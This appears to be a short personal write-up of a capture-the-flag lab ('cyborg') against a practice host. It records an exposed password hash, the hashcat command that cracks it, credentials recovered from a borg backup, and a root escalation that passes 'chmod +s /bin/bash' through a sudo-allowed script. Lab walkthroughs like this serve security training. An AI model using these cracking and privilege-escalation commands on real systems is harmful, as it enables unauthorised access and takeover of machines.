# 10.10.55.251

# pages
http://10.10.55.251/admin/
http://10.10.55.251/etc/squid/



# users
Alex 
Josh
Adam


# services 

squid proxy 


# files /pathes 

music_archive



# methodology:

music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn. (from http://10.10.55.251/etc/squid/)



Crack the hash found: 
hashcat -m 1600 -a 0 h.hash ~/wordlists/rockyou.txt

password: squidward




Downloaded the archive zip file from the intial website

unzip it and run checked it with borg:

borg list /home/field/dev/final_archive

output: Enter passphrase for key /home/king/TryHackMe/cyborg/home/field/dev/final_archive: 
music_archive                        Tue, 2020-12-29 09:00:38 [f789ddb6b0ec108d130d16adebf5713c29faf19c44cad5e1eeb8ba37277b1c82]



# unpack:

mkdir unpack

borg mount home/field/dev/final_archive unpack

# find new creds in unpacked files

alex:S3cretP@s3



# esc. priv. 

## sudo -l

(ALL : ALL) NOPASSWD: /etc/mp3backups/backup.sh


check backup.sh, seems like an argument can be passed to it. 

sudo /etc/mp3backups/backup.sh -c "chmod +s /bin/bash"


and the rest is history:  /bin/bash -p